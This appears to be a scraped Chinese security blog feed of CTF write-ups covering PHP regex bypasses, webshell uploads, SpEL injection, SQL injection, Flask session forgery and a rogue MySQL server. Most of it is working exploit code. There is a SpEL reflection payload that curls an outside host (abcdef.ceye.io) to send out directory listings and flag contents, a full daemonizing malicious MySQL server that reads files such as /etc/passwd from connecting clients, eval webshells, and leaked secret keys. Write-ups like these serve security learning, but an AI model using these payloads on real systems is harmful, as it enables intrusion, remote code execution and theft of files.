$action('', $arg);&#125; 可以看到，题目想要我们输入两个参数绕过正则，然后就可以执行任意命令了 题解寻找可利用字符我们先审计源码，可以看到如果传过来action和arg那就分别赋值，然后对action进行正则表达式过滤先看正则表达式1234/^[a-z0-9_]*$/isD/i 忽略大小写/s 匹配任何不可见字符/D 如果正则表达式用$限制结尾字符，则不允许结尾有换行 所以我们现在就要找一个开头不是字母数字和下划线的值，同时还要可以正常地执行函数因此我们先fuzz一下1234567891011import requestsfor i in range(0,256): s= hex(i)[2:] if len(s)&lt;2: s = '%0'+s else: s = '%'+s url = 'http://xiaorouji.cn:8087/?action='+s+'var_dump&amp;arg=find' r = requests.get(url=url).content if 'find' in r: print s 跑出来%5c可以成功绕过，原因p神在小密圈说了12php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 寻找getshell函数接下来的利用我们就要用到create_function函数了在官方手册中它是这样的1create_function ( string $args , string $code ) : string 这个函数由两个参数组成，第一个是函数名，第二个是函数内的代码。官方例子如下12345$newfunc = create_function('$a,$b', 'return \"ln($a) + ln($b) = \" . log($a * $b);');实际上也就是 function test($a,$b)&#123; return \"ln($a) + ln($b) = \".log($a*$b);&#125; 顺便看一下create_function的源码也可以看到第一个参数是用(闭合的，第二个是用{闭合的 getflag剩下的就是闭合以及利用了,尝试一下能不能得到phpinfo接下来就是getshell了，尝试下利用system函数发现被禁了，那就试下scandir函数成功getflag（这个flag是在上一层的目录上 parewaf这个题目依旧很短，考的是php的正则特性 题目1234567891011121314151617 &lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo \"bad request\";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header(\"Location: $path\", true, 303);&#125; 可以看到，这是一个上传文件的代码首先拿到了文件会先判断是不是里面有没有php代码，如果有就返回bad request，否则就新建一个路径为data/md5($_SERVER[&#39;REMOTE_ADDR&#39;])，然后将文件命名为randon_int(0,10).php存储在新建的文件夹里面，最后将存储路径在http头里面返回过来 题解分析正则首先我们先看一下他的正则表达式1/&lt;\\?.*[(`;?&gt;].*/is 的匹配过程可以看到它先是从前面匹配了&lt;?，接下来的.*将所有都匹配了，然后还需要匹配就要回溯回去前面，因此一直回溯到前面的&gt;完成符号匹配，然后从该点开始向后进行匹配，完成最后的.*匹配而同时，php为了防止正则表达式的拒绝服务攻击，设置了一个回溯次数的上限而如果回溯次数超过1000000的时候，它的返回就变成了false了 payload既然已经知道要怎么绕过漏洞点了，接下来就是写payload了123456789import requestsfrom io import BytesIOfile = &#123; 'file': BytesIO('&lt;?php eval($_POST[\"cmd\"]);//' + 'a'*1000010)&#125;res = requests.post('http://xiaorouji.cn:8088/',files=file,allow_redirects=False)print res.headers['Location'] 拿到了shell文件目录以后就是利用了getflag√ phpmagic这个题目让人感觉略为懵逼，但是找到源码就做起来舒服了 题目源码如下123456789101112131415161718192021if(isset($_GET['read-source'])) &#123; exit(show_source(__FILE__));&#125;define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST['domain']) ? $_POST['domain'] : '';$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(\"dig -t A -q %s\", escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER['SERVER_NAME'] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output;endif; 题解审计源码可以看到，文件名和文件内容我们都是可以知道的，但是文件内容会经过htmlspecialchars，所以想直接传个小马是8可能的，但是php有一个特性，只要能进行文件传输的地方，基本是都是能进行协议流的传输的，我们先本地尝试一波果然可以写文件，那么现在问题来了，文件名前面会加上$_SERVER[&#39;SERVER_NAME&#39;]，同时后缀几乎全部过滤了，还有就是文件内容也不是完全可控的首先文件名前面加上的$_SERVER[&#39;SERVER_NAME&#39;]，我们可以通过修改Host的值达到控制的目的接下来，我们想要绕过后缀要用到一个黑魔法，所以我们只要在文件名后面加个\\.就可以绕过限制了最后是文件内容不可控，但是我们可以看到，我们传过去的是base64编码的，在php伪协议解码的时候，遇到不规范的字符是会自动跳过解码的，因此我们只需要填充前面的规范字符使前面的字符是4的倍数，就能成功的让我们想写的shell文件成功解码了先找一下前面的字符可以看到规范字符ltltgtgtDiG9959deb8u15DebianltltgtgttAq刚好40位，4的倍数，所以直接加文件内容就行啦接下来就是利用了这样就能写进webshell了 phplimit这道题目很短，满足了正则就能执行任意命令了 题目123456&lt;?phpif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; else &#123; show_source(__FILE__);&#125; 题解从正则表达式可以看到它会匹配字母和括号，接下来找一找能绕过的方法可以看到只要最内层的函数没有参数的话，正则就能绕过，这里我们利用session去达到执行命令的目的session_id，用来设置或者获取当前会话的id，对应PHPSESSID的值session_start，用来创建新的会话或者重用现有会话因此我们可以利用session_id(session_start())，但是PHPSESSID只允许字母数字和下划线，所以要将字符换下编码最后就是利用了还有一个其他师傅的payload1readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); 巨强 nodechr一进去就是一大堆代码…… 题目首先审计源码可以看到题目将flag放进去数据库，然后让用户登录进去，先贴一波关键源码12345678910111213141516171819202122232425function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\\-\\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == 'POST') &#123; let username = safeKeyword(ctx.request.body['username']) let password = safeKeyword(ctx.request.body['password']) let jump = ctx.router.url('login') if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM \"users\" WHERE \"username\" = '$&#123;username.toUpperCase()&#125;' AND \"password\" = '$&#123;password.toUpperCase()&#125;'`) if (user) &#123; ctx.session.user = user jump = ctx.router.url('admin') &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render('index') &#125;&#125; 可以看到他将union和select那些过滤了，所以想直接读flag有点难，但是我们可以看到有个toUpperCase函数，看下ph牛的这篇文章，因此我们可以利用这些字符写payload最终payload123456789#coding:utf-8import requests,base64url = \"http://xiaorouji.cn:8085/login\"data = &#123; \"username\": \"admin\", \"password\": \"0' unıon ſelect 1,flag,3 from flags where '1'='1\"&#125;res = requests.post(url,data=data).contentprint res Javacon这题我们首先可以拿到一个jar包，然后用idea反编译出来可以看到一堆的java代码，肉鸡枯了…….先看一下目录结构，有5个类和一个配置文件配置文件里面放了用户信息，因此我们用admin/admin是可以登录进网站的接下来就去看MainController文件，这里只放重点函数可以看到登录的时候，如果选了remember-me，就会将用户加密存储在cookie里面接着admin会对跳转之后的cookie做处理，判断remember-me的值是否存在，如果存在就解密验证过程上图，可以看见是先找黑名单，如果匹配出来返回FORBIDDEN，否则就继续下面的语句，在SmallEvaluationContext中进行SPEL解析，又因为有黑名单java.+lang,Runtime,exec.*\\(，所以最后的利用字符串拼接和反射构造pop链exp如下1234567891011121314151617181920212223242526272829303132package com.company;import javax.crypto.spec.IvParameterSpec;import java.util.Base64;import javax.crypto.Cipher;import javax.crypto.spec.SecretKeySpec;import org.slf4j.LoggerFactory;class Encryptor&#123; static org.slf4j.Logger logger = LoggerFactory.getLogger(Encryptor.class); public static String encrypt(String key, String initVector, String value)&#123; try&#123; IvParameterSpec iv = new IvParameterSpec(initVector.getBytes(\"UTF-8\")); SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes(\"UTF-8\"),\"AES\"); Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\"); cipher.init(1, skeySpec, iv); byte[] encrypted = cipher.doFinal(value.getBytes()); return Base64.getUrlEncoder().encodeToString(encrypted); &#125;catch (Exception e)&#123; logger.warn(e.getMessage()); &#125; return null; &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; //查看目录 System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]&#123;'/bin/bash','-c','curl http://abcdef.ceye.io/`cd / &amp;&amp; ls|base64|tr \\\"\\n\\\" \\\"-\\\"`'&#125;)&#125;\")); //读flag文件 System.out.println(Encryptor.encrypt(\"c0dehack1nghere1\", \"0123456789abcdef\", \"#&#123;T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.l'+'ang.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.l'+'ang.Ru'+'ntime')),new String[]&#123;'/bin/bash','-c','curl http://abcdef.ceye.io/`cat flag_j4v4_chun|base64`'&#125;)&#125;\")); &#125;&#125; 读目录读flag","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/20/code-breaking-easy/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"Code Breaking","slug":"Code-Breaking","permalink":"https://xi4or0uji.github.io/tags/Code-Breaking/"},{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"},{"name":"javascript","slug":"javascript","permalink":"https://xi4or0uji.github.io/tags/javascript/"}]},{"title":"2019GWHT考核题wp","date":"2019-03-16T16:00:00.000Z","path":"2019/03/17/2019GWHT考核题wp/","text":"本来想着招新完讲完题就不用题解了，但是看见有些小朋友还是很懵逼，补上一篇 WEBweb签到题网址：http://xiaorouji.cn:2334/web1/这道题其实考察的是对http头的各种操作还有抓包，首先进去题目看到一堆骚话，完了以后就是问do you know GWHT browser?，很明显是要我们改访问的浏览器，接着是only accept www.gwht.com to visit this website，修改访问网站，然后you are not the localhost, prprprpr，要求本地访问，然后就是i only know Spanish......，明显是要改accept-language，出题人背锅了，这里当初谷歌的时候是es-es，结果没想到百度居然不是这个，导致一堆不匹配，坑死一堆小朋友……….最后是You have not logged in yet，改cookie就行，所以最终改出来的包是接着通过抓包可以看到它会先跳去flag2333.php然后立刻转去noflag.php所以最后我们看flag2333.php的包就能看到flag了 do u know 菜刀？网址：http://xiaorouji.cn:2333/web2/这道题进去首先看到一个假flag，但是同时还提示有个shell在这个网站里面扫一下后台看见有个shell.php访问一下试下看到有个小马，接着就是菜刀连过去了连过去以后可以看到一个flag.js将它下下来打开看看，明显是aaencode加密拿去网站解密出来是这段明显是一张图片的base64编码，将它转图片是个二维码，扫一下就出flag了 sql注入网址：http://shifeng-kaze.cn:912/先网页进去源码可以看到注入语句可以看到它是在数据库选出一个密码然后和传过来md5加密的passwd对比，如果相等就登录成功，payload如下登录成功以后就到了第二关了，还是一个sql注入的地方，要去找no和name，fuzz一下看一下过滤了什么可以看到第一个参数过滤了\\ # =，第二个参数过滤了‘`，所以我们可以利用单引号逃逸完成注入，最终payload如下，爆数据库爆表那些就不放上去了1no=-1\\&amp;name= union select val from gwhts limit 1,1 # serialize’s revenge网址：http://xiaorouji.cn:100/web4/这题在robots.txt可以看到一部分源码123456789$file = $_GET['file'];$text = $_GET['text'];if (!!$text || file_get_contents($text,'r') === \"hello ctf\")&#123; echo \"hi!\".\"&lt;br&gt;\"; include ($file); //backdoor.php&#125;else&#123; echo \"you are not my friend!\"; exit();&#125; 可以看到有一个文件包含漏洞，利用php://filter去读文件出来拿到了base64加密后的数据后解密就有源码了12345678910111213141516171819202122232425262728293031&lt;?phpclass Flag&#123; public $obj; public function __construct()&#123; $this-&gt;obj = new Safe; &#125; public function __toString()&#123; if (isset($this-&gt;obj))&#123; return $this-&gt;obj-&gt;read(); &#125;else&#123; return \"go away hacker\"; &#125; &#125;&#125;class Secret&#123; //fllllllag.php public $file; public function read()&#123; return file_get_contents($this-&gt;file); &#125;&#125;class Safe&#123; public function read()&#123; return \"it's very safe!\"; &#125;&#125;$secret = $_GET['secret'];if (isset($secret))&#123; echo unserialize($secret);&#125;else&#123; echo \"your hat is too black!\";&#125; 接着就是审计源码了，可以看到有个Flag，Secret和Safe三个类，接着也可以看到Secret类有个file_get_contents函数，可以读取任意文件，同时也提示了fllllllag.php，但是没有可以引发这个函数的方法，最后看去Flag这个类，可以知道$obj其实是一个类，里面的__toString魔幻函数可以调用$obj这个类的read函数，因此最终的pop链就是构造Flag类，设定$obj为Secret类，Secret类的$file设定为fllllllag.php，最后序列化Flag这个类，反序列化时触发漏洞，exp如下12345678910111213141516171819202122&lt;?phpclass Flag&#123; public $obj; public function __construct()&#123; $this-&gt;obj = new Secret; &#125; public function __toString()&#123; if (isset($this-&gt;obj))&#123; return $this-&gt;obj-&gt;read(); &#125;else&#123; return \"go away hacker\"; &#125; &#125;&#125;class Secret&#123; //fllllllag.php public $file = \"fllllllag.php\" ; public function read()&#123; return file_get_contents($this-&gt;file); &#125;&#125;$flag = new Flag();echo serialize($flag); 最后回到index.php去触发反序列化漏洞","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/17/2019GWHT考核题wp/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"利用mysql local infile读取客户端文件","date":"2019-03-14T16:00:00.000Z","path":"2019/03/15/利用mysql-local-infile读取客户端文件/","text":"这个利用点是之前补hgame的题看到的一个考点，记录一下 MySQL LOAD DATA INFILE简介先看一张官方文档的图可以看到，握手阶段中会：1234客户端和用户端交换各自功能根据需要创建SSL通道接收客户端的回应验证客户端身份进行通信 我们在linux里面tcpdump一下抓取数据包tcpdump -i lo -w mysql.pcap port 3306，然后连接mysql看下数据包可以看到登录的数据包里面有个Can Use LOAD DATA LOCAL开启了，只要开启了这个，就可以将运行mysql客户端的主机的文件传输到远程服务器中而load data infile这个命令里主要是将读到的文件的内容放进表中12load data infile &apos;/etc/passwd&apos; into table test;load data local infile &apos;/etc/passwd&apos; into table test; 两个语句的差别就是第二个读取的是客户端的文件并放入表中，那么问题来了，如果我们可以弄个恶意的mysql服务器，那么是不是就可以将连接到这个服务器的客户端的敏感文件都读出来想要伪造mysql服务端，首先我们先要了解他们之间的通信是怎样的 mysql通信步骤继续是在linux里面抓包，把流量包拿下来分析可以看到，首先是greeting包，这是第一个步骤接下来是login包然后就是一些初始化查询接下来就是用户的查询，这里我查询的是load data local infile这个语句，请求访问客户端的/etc/passwd文件然后服务端又返回了一个/etc/passwd的流量包这个时候客户端发回来的就是/etc/passwd文件的内容了好了，到了这里我们大概有点思路了，如果我们改了服务端返回的数据包，要求请求其他文件，客户端是不是会继续发过来呢，幸运的是，确实是这样的客户端并没有记住自己上次请求的文件究竟是什么，他只是根据服务端要求传输文件，简单来说就是可以看到，无论服务端说什么，客户端都是会执行的，好的，现在还有一个问题，就是我不一定每次都能等到客户端向我发出文件请求，看回上面的安全文档，可以看到后面还有一句，就是服务端可以在任何语句后面回复一句文件传输要求，同时我们还记得，在mysql连接的时候，客户端是会先来一句初始化的查询去探测指纹信息的，因此，我们可以直接利用了 恶意mysql服务端伪造现在我们需要做的就是制作恶意的服务端，完成下面几个步骤：123向mysql client发送server greeting等待client发送一个query 然后回复一个file tranfer请求 这样我们就可以看到拿到任意的文件了exp如下（改动github上面的脚本）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232#!/usr/bin/env python#coding: utf8import socketimport asyncoreimport asynchatimport structimport randomimport loggingimport logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.DEBUG)tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')tmp_format.setFormatter(logging.Formatter(\"%(asctime)s:%(levelname)s:%(message)s\"))log.addHandler( tmp_format)filelist = ( '/etc/passwd')#================================================#=======No need to change after this lines=======#================================================__author__ = 'Gifts'def daemonize(): import os, warnings if os.name != 'posix': warnings.warn('Cant create daemon on non-posix system') return if os.fork(): os._exit(0) os.setsid() if os.fork(): os._exit(0) os.umask(0o022) null=os.open('/dev/null', os.O_RDWR) for i in xrange(3): try: os.dup2(null, i) except OSError as e: if e.errno != 9: raise os.close(null)class LastPacket(Exception): passclass OutOfOrder(Exception): passclass mysql_packet(object): packet_header = struct.Struct('&lt;Hbb') packet_header_long = struct.Struct('&lt;Hbbb') def __init__(self, packet_type, payload): if isinstance(packet_type, mysql_packet): self.packet_num = packet_type.packet_num + 1 else: self.packet_num = packet_type self.payload = payload def __str__(self): payload_len = len(self.payload) if payload_len &lt; 65536: header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num) else: header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num) result = \"&#123;0&#125;&#123;1&#125;\".format( header, self.payload ) return result def __repr__(self): return repr(str(self)) @staticmethod def parse(raw_data): packet_num = ord(raw_data[0]) payload = raw_data[1:] return mysql_packet(packet_num, payload)class http_request_handler(asynchat.async_chat): def __init__(self, addr): asynchat.async_chat.__init__(self, sock=addr[0]) self.addr = addr[1] self.ibuffer = [] self.set_terminator(3) self.state = 'LEN' self.sub_state = 'Auth' self.logined = False self.push( mysql_packet( 0, \"\".join(( '\\x0a', # Protocol '5.7.23-0ubuntu0.16.04.1' + '\\00', # Version #'5.1.66-0+squeeze1' + '\\0', '\\x31\\x00\\x00\\x00', # Thread ID '\\x0b\\x05\\x32\\x62\\x1a\\x6b\\x4e\\x3c' + '\\00', # Salt '\\xff\\xf7', # Capabilities '\\x08', # Collation '\\x02\\x00\\xff\\x81\\x15', # Server Status '\\00' * 10, # Unknown '\\x75\\x41\\x1f\\x0e\\x5d\\x22\\x3e\\x05\\x21\\x56\\x14\\x5d' + '\\00', \"mysql_native_password\" + '\\x00' )) ) ) self.order = 1 self.states = ['LOGIN', 'CAPS', 'ANY'] def push(self, data): log.debug('Pushed: %r', data) data = str(data) asynchat.async_chat.push(self, data) def collect_incoming_data(self, data): log.debug('Data recved: %r', data) self.ibuffer.append(data) def found_terminator(self): data = \"\".join(self.ibuffer) self.ibuffer = [] if self.state == 'LEN': len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1 if len_bytes &lt; 65536: self.set_terminator(len_bytes) self.state = 'Data' else: self.state = 'MoreLength' elif self.state == 'MoreLength': if data[0] != '\\0': self.push(None) self.close_when_done() else: self.state = 'Data' elif self.state == 'Data': packet = mysql_packet.parse(data) try: if self.order != packet.packet_num: raise OutOfOrder() else: # Fix ? self.order = packet.packet_num + 2 if packet.packet_num == 0: if packet.payload[0] == '\\x03': log.info('Query') filename = random.choice(filelist) PACKET = mysql_packet( packet, '\\xFB&#123;0&#125;'.format(filename) ) self.set_terminator(3) self.state = 'LEN' self.sub_state = 'File' self.push(PACKET) elif packet.payload[0] == '\\x1b': log.info('SelectDB') self.push(mysql_packet( packet, '\\xfe\\x00\\x00\\x02\\x00' )) raise LastPacket() elif packet.payload[0] in '\\x02': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() elif packet.payload == '\\x00\\x01': self.push(None) self.close_when_done() else: raise ValueError() else: if self.sub_state == 'File': log.info('-- result') log.info('Result: %r', data) if len(data) == 1: self.push( mysql_packet(packet, '\\0\\0\\0\\x02\\0\\0\\0') ) raise LastPacket() else: self.set_terminator(3) self.state = 'LEN' self.order = packet.packet_num + 1 elif self.sub_state == 'Auth': self.push(mysql_packet( packet, '\\0\\0\\0\\x02\\0\\0\\0' )) raise LastPacket() else: log.info('-- else') raise ValueError('Unknown packet') except LastPacket: log.info('Last packet') self.state = 'LEN' self.sub_state = None self.order = 0 self.set_terminator(3) except OutOfOrder: log.warning('Out of order') self.push(None) self.close_when_done() else: log.error('Unknown state') self.push('None') self.close_when_done()class mysql_listener(asyncore.dispatcher): def __init__(self, sock=None): asyncore.dispatcher.__init__(self, sock) if not sock: self.create_socket(socket.AF_INET, socket.SOCK_STREAM) self.set_reuse_addr() try: self.bind(('', PORT)) except socket.error: exit() self.listen(5) def handle_accept(self): pair = self.accept() if pair is not None: log.info('Conn from: %r', pair[1]) tmp = http_request_handler(pair)z = mysql_listener()daemonize()asyncore.loop() 这里有个坑点就是连接要以127.0.0.1去连接mysql，因为localhost是以socket连接的到了这里我们就可以伪造mysql读取客户端任意文件了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/03/15/利用mysql-local-infile读取客户端文件/","categories":[{"name":"web","slug":"web","permalink":"https://xi4or0uji.github.io/categories/web/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"https://xi4or0uji.github.io/tags/mysql/"}]},{"title":"2019 hgame week4","date":"2019-03-10T16:00:00.000Z","path":"2019/03/11/2019-hgame-week4/","text":"happy python这题就是很普遍的session伪造，首先在url后面加49发现确实可以执行，但是测试一下发现过滤了括号，所以想直接ssti是很难的了解密一下session猜测是不是将user_id改成1就能以admin的身份登进去，现在就要想办法拿到secret_key了尝试了一下，发现url_for还在，就用url_for去拿secret_key，payload如下1url_for.__globals__['current_app'].config 然后得到回显1&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '9RxdzNwq7!nOoK3*', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'CSRF_ENABLED': True, 'SQLALCHEMY_DATABASE_URI': 'mysql+pymysql://hgame:asdkjhiou12312451r2@127.0.0.1:3306/hgame', 'SQLALCHEMY_TRACK_MODIFICATIONS': True, 'WTF_CSRF_ENABLED': True, 'WTF_CSRF_CHECK_DEFAULT': True, 'WTF_CSRF_METHODS': &#123;'PUT', 'DELETE', 'POST', 'PATCH'&#125;, 'WTF_CSRF_FIELD_NAME': 'csrf_token', 'WTF_CSRF_HEADERS': ['X-CSRFToken', 'X-CSRF-Token'], 'WTF_CSRF_TIME_LIMIT': 3600, 'WTF_CSRF_SSL_STRICT': True, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False&#125;&gt; 拿到secret_key1'SECRET_KEY': '9RxdzNwq7!nOoK3*' 接着就是伪造然后就能拿到session了1.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k9g-fsAkgo_Vg.D2qpTQ.OJF7PpG3QqUlvvBoSs3wQ1wL2eM 登录进去以后getflaghgame{Qu_bu_la1_m1ng_z1_14} happy php源码放去了githubhttps://github.com/Lou00/laravel，在源码中看到在app/Http/Controllers/SessionsController.php可以看到1234567891011121314151617181920public function store(Request $request) &#123; $credentials = $this-&gt;validate($request, [ 'email' =&gt; 'required|email|max:100', 'password' =&gt; 'required' ]); if (Auth::attempt($credentials)) &#123; if (Auth::user()-&gt;id ===1)&#123; session()-&gt;flash('info','flag :******'); return redirect()-&gt;route('users.show'); &#125; $name = DB::select(\"SELECT name FROM `users` WHERE `name`='\".Auth::user()-&gt;name.\"'\"); session()-&gt;flash('info', 'hello '.$name[0]-&gt;name); return redirect()-&gt;route('users.show'); &#125; else &#123; session()-&gt;flash('danger', 'sorry,login failed'); return redirect()-&gt;back()-&gt;withInput(); &#125; &#125; 可以看到这里有个name的注入点，来个账号测试一下amdin&#39; or &#39;1&#39;=&#39;1，发现确实可以以admin的身份登录进去1234admin' union select password From `users` WHERE `id`='1' LIMIE 0,1;#'读到密码eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==admin' union select email FROM `users` WHERE `id`='1' LIMIT 0,1;#'读到邮箱admin@hgame.com base64解码一下密码是1&#123;\"iv\":\"rnVrqfCvfJgnvSTi9z7KLw==\",\"value\":\"EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=\",\"mac\":\"56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af\"&#125; 在github的commit看到这段12345APP_NAME=LaravelAPP_ENV=localAPP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=APP_DEBUG=trueAPP_URL=http://localhost 接下来就是要想办法解密密码，我们有的信息123$hey = '9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='$iv = 'rnVrqfCvfJgnvSTi9z7KLw=='$value = 'EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=' 然后是jio本12345678910import base64from Crypto.Cipher import AESdef dec(c): c = base64.b64decode(c) iv = base64.b64decode('rnVrqfCvfJgnvSTi9z7KLw==') key = AES.new(base64.b64decode('9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ='), AES.MODE_CBC,iv) return key.decrypt(c)print dec('EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=') 然后就获得密码9pqfPIer0Ir9UUfR，接着登录进去就行 happy java题目一开始提示说flag在hgame_flag目录下直接访问发现是404，尝试扫一下端口12345678910111213141516nmap -p0-65535 119.28.26.122#结果PORT STATE SERVICE22/tcp open ssh135/tcp filtered msrpc139/tcp filtered netbios-ssn445/tcp filtered microsoft-ds593/tcp filtered http-rpc-epmap901/tcp filtered samba-swat1025/tcp filtered NFS-or-IIS3128/tcp filtered squid-http4444/tcp filtered krb5246129/tcp filtered unknown6667/tcp filtered irc9876/tcp open sd31337/tcp open Elite 可以看到，还有一个9876端口开放，扫后台扫到一个mappings12345678910111213141516171819202122232425262728293031323334&#123; \"/webjars/**\":&#123; \"bean\":\"resourceHandlerMapping\" &#125;, \"/**\":&#123; \"bean\":\"resourceHandlerMapping\" &#125;, \"/**/favicon.ico\":&#123; \"bean\":\"faviconHandlerMapping\" &#125;, \"&#123;[/index],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.Index()\" &#125;, \"&#123;[/you_will_never_find_this_interface],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)\" &#125;, \"&#123;[/secret_flag_here],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)\" &#125;, \"&#123;[/error],methods=[GET]&#125;\":&#123; \"bean\":\"requestMappingHandlerMapping\", \"method\":\"public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()\" &#125;, 